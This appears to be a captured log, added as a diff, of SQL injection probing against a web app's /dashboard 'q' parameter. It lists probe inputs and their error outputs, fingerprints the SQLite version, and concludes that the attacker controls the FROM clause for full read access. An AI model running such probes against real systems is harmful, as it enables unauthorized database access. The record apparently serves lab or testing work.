@@ -1,0 +1,30 @@
+# Captured: 2026-10-10 19:25 UTC (successful run)
+# Injection point: GET /dashboard?q=<value>   (authenticated as guest)
+# The app runs SQL of the form:  SELECT <value>
+
+q=test
+  -> <pre>no such column: test</pre>
+
+q=guest
+  -> <pre>no such column: guest</pre>
+
+q=1
+  -> <pre>[{&#39;1&#39;: 1}]</pre>
+
+q=1,2
+  -> <pre>[{&#39;1&#39;: 1, &#39;2&#39;: 2}]</pre>
+
+q=*
+  -> <pre>no tables specified</pre>          # => SELECT * with no FROM, i.e. SELECT {q}
+
+q=sqlite_version()
+  -> <pre>[{&#39;sqlite_version()&#39;: &#39;3.46.1&#39;}]</pre>
+
+q=name        -> <pre>no such column: name</pre>
+q=username    -> <pre>no such column: username</pre>
+q=password    -> <pre>no such column: password</pre>
+q=title       -> <pre>no such column: title</pre>
+q=id          -> <pre>no such column: id</pre>
+
+# CONCLUSION: q is interpolated into the SELECT column list of a bare SELECT.
+# We control the FROM clause -> full read-only SQLite access.
